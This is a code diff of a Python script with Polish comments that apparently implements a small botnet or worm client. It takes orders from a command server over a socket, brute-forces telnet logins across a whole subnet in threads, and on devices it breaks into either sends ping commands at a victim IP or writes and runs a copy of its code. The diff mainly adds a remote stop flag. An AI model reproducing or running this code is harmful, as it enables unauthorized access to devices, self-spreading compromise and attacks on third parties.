@@ -1,10 +1,16 @@
 import socket
 import time
 import telnetlib
-#przekazac kopię
+# przekazac kopię
 # from requests import get       ->       można publiczny ip używać    w sumie nie wiem po co xD
 from _thread import start_new_thread
 
+attack = False
+
+
+# todo: zrobić przerwanie ataku idk jak ( można odczytywać zmienną globalną, a w mainie wątek ktory odczytuje tą
+#  zmienną? w sumie wystarczy w funkcjach )
+#
 
 def telnetConnect(ip_address, victimIP, attackType: int):
     # można zrobić pętlę do wczytywania user credentials z pliku
@@ -14,6 +20,9 @@ def telnetConnect(ip_address, victimIP, attackType: int):
     for user in users:
         # print('connecting with login: ' + user)
         for password in passwords:
+            time.sleep(10)
+            if not attack:
+                print("telnet return")
 
             try:
                 tn = telnetlib.Telnet(ip_address, port=23)
@@ -37,7 +46,10 @@ def telnetConnect(ip_address, victimIP, attackType: int):
 
             if attackType == 1:  # note
                 print('pingujemy..')
-                tn.write(b"ping 192.168.100.7\n")
+                tn.write(b"ping 192.168.100.7\n")  # można zrobić wątki
+                if not attack:
+                    print("stopping attack")
+                    return
                 time.sleep(60)
 
                 # print(tn.read_all().decode('ascii'))
@@ -52,8 +64,11 @@ def telnetConnect(ip_address, victimIP, attackType: int):
                 print(tn.write(bytes('echo' + '"' + str1 + '"' + '>>' + 'code.py', encoding="ascii")))
                 print(tn.write(b"python code.py"))
                 file.close()
+                if not attack:
+                    print(tn.write(b"exit"))  # todo:jak wyjść z wykonującego sie skryptu?!?!
+                    return
 
-            # tn.write(b"exit\n")
+                    # tn.write(b"exit\n")
             tn.close()
 
     # t.close()
@@ -67,24 +82,28 @@ def checkForOtherDevices(ip, victimIP):
     print('connecting to telnet...')
 
     while x < 254:
+        if not attack:
+            return
         current_address = ip + str(x)
         # próbuj połączyć z każdym przez telnet
         # print(current_address)
         start_new_thread(telnetConnect, (current_address, victimIP, 1))
-        # telnetConnect(current_address, victimIP, attackType=1)# --> w wątku chyba???
         x += 1
 
     print('finished')
 
 
+
+
 if __name__ == '__main__':
 
-    HOST = '192.168.100.6'  # The server's hostname or IP address
+    HOST = '127.0.0.1'  # The server's hostname or IP address
     PORT = 65432  # The port used by the server
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         flag = 0
         while True:
+
             if flag == 1:
                 continue
 
@@ -113,16 +132,22 @@ if __name__ == '__main__':
                 victim_ip = str(s.recv(1024).decode())
                 print('victim address:' + str(victim_ip))
                 checkForOtherDevices(HOST, victim_ip)
-
-            elif data == 2:
+                attack = True
+            elif data == 2:  # dostan nowe ip serwera
 
                 HOST = s.recv(1024)
                 s.close()
-
+                flag = 0
+                continue
             else:
                 print('something went wrong')
 
-            time.sleep(20)
+            # zrobić try zeby sie nie wywalilo
+            stop = str(s.recv(1).decode())
+            if stop == '0':
+                attack = False
+                print("Stoping")
+            time.sleep(5)
             # ip = get('https://api.ipify.org').text
             # print('public IP address: {}'.format(ip))
             # print('operating port: {}'.format(PORT))
